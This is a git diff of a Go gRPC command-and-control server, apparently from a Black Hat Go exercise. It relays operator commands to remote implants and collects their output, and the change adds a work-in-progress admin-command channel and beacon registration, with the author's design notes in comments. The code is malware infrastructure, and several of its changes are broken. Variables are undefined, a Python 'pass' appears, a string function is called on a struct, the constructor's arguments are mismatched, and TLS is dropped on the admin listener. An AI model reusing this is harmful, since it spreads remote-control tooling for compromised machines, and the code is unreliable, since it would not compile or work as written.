@@ -9,7 +9,10 @@ import (
         "log"
         "errors"
         "net"
+	"time"
+	"strings"
 
+	"github.com/blackhat-go/bhg/ch-14/grpcapi"
         "google.golang.org/grpc"
         "google.golang.org/grpc/credentials"
 
@@ -20,10 +23,9 @@ type implantServer struct {
 }
 
 type adminServer struct {
-        work, output chan *grpcapi.Command
+        work, output, adminCommands chan *grpcapi.Command // we're adding adminCommands here to this type. These will be server specific and don't get sent to beacons
 }
 
-// Implant server handles connections from the implants
 func NewImplantServer(work, output chan *grpcapi.Command) *implantServer {
         s := new(implantServer)
         s.work = work
@@ -31,15 +33,14 @@ func NewImplantServer(work, output chan *grpcapi.Command) *implantServer {
         return s
 }
 
-// Admin server handles connections from the operator and doles out commands to implants
-func NewAdminServer(work, output chan *grpcapi.Command) *adminServer {
+func NewAdminServer(adminCommand, work, output chan *grpcapi.Command) *adminServer {
         s := new(adminServer)
         s.work = work
         s.output = output
+		s.adminCommands = adminCommand
         return s
 }
 
-// Handles creating a job queue for the implants that connect in
 func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {
         var cmd = new(grpcapi.Command)
         select {
@@ -54,35 +55,54 @@ func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) 
         }
 }
 
-func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
+func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) { // using s in the func name to use the type defined above (s *implantServer)
         s.output <- result
         return &grpcapi.Empty{}, nil
 }
 
+func (s *adminServer) AdminCommand(ctx context.Context, adminCommand *grpcapi.Command) (*grpcapi.Command, error) {
+	return res, nil
+}// I think we need to make a new function here and in thew NewAdminServer we need to do a check on what command is passed??
+
 func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error) {
         var res *grpcapi.Command
-        go func() {
-                s.work <- cmd
-        }()
-        res = <-s.output
-        return res, nil
+		// if cmd.startsWith('1') then s.work <- cmd else s.adminCommands <- cmd
+		// case listClients, case removeClient, etc...
+		// maybe we have to cast cmd to s.adminCommand and check it outside of here before giving it to s.work?
+		if strings.HasSuffix(cmd, "1") {
+			go func() { // this function takes in the command and sends it to the work queue, we should add some logic here to check if it's an admin command or an implant command
+				s.work <- cmd // this is the worker queue, we added adminCommands up top
+			}()
+			res = <-s.output
+		}
+		return res, nil
+
+}
+
+func (s *implantServer) RegisterClient(ctx context.Context) {
+	client := make(map[string]string)
+	tempHold = <- s.output // using the s channel, get the output. Need to find better way to get hello from beacon
+	_,err := set[tempHold] // check if beacon already registered
+	if err != nil{pass} // if there is an error, do nothing
+	dt := time.Now()
+	client[tempHold] = dt.String() // otherwise add our new name to the set
 }
 
 func main() {
         var (
                 implantListener, adminListener net.Listener
                 err                            error
-                //opts                           []grpc.ServerOption
-                work, output                   chan *grpcapi.Command
-        )  
-        // These are the settings to handle mTLS. We have to load our certs
-        certificate, err := tls.LoadX509KeyPair(
-	"/etc/servers/certs/client-cert.pem",
-	"/etc/servers/certs/client-key.pem",
+                opts                           []grpc.ServerOption
+                work, output, adminCommand     chan *grpcapi.Command
+        )
+
+		certificate, err := tls.LoadX509KeyPair(
+	"/etc/server/certs/server.crt",
+	"/etc/server/certs/server.key",
 	)
 
 	certPool := x509.NewCertPool()
-	bs, err := ioutil.ReadFile("/etc/servers/certs/ca-cert.pem")
+	bs, err := ioutil.ReadFile("/etc/server/certs/ca.crt")
 	if err != nil {
 		log.Fatalf("failed to read client ca cert: %s", err)
 	}
@@ -97,26 +117,24 @@ func main() {
 		Certificates: []tls.Certificate{certificate},
 		ClientCAs:    certPool,
 	}
-        
-        work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
+
+        work, output, adminCommand = make(chan *grpcapi.Command), make(chan *grpcapi.Command), make(chan *grpcapi.Command)
         implant := NewImplantServer(work, output)
-        admin := NewAdminServer(work, output)
-        if implantListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 4444)); err != nil {
+        admin := NewAdminServer(work, output, adminCommand)
+        if implantListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 8010)); err != nil {
                 log.Fatal(err)
         }
         if adminListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 9090)); err != nil {
                 log.Fatal(err)
         }
-        
-  // Setup the TLS config
+
         serverOption := grpc.Creds(credentials.NewTLS(tlsConfig))
-  
-  // Use the TLS config
+
         grpcImplantServer := grpc.NewServer(serverOption)
-        grpcAdminServer := grpc.NewServer(serverOption)
+        grpcAdminServer := grpc.NewServer(opts...)
         grpcapi.RegisterImplantServer(grpcImplantServer, implant)
         grpcapi.RegisterAdminServer(grpcAdminServer, admin)
-        
+
         go func() {
                 grpcImplantServer.Serve(implantListener)
         }()
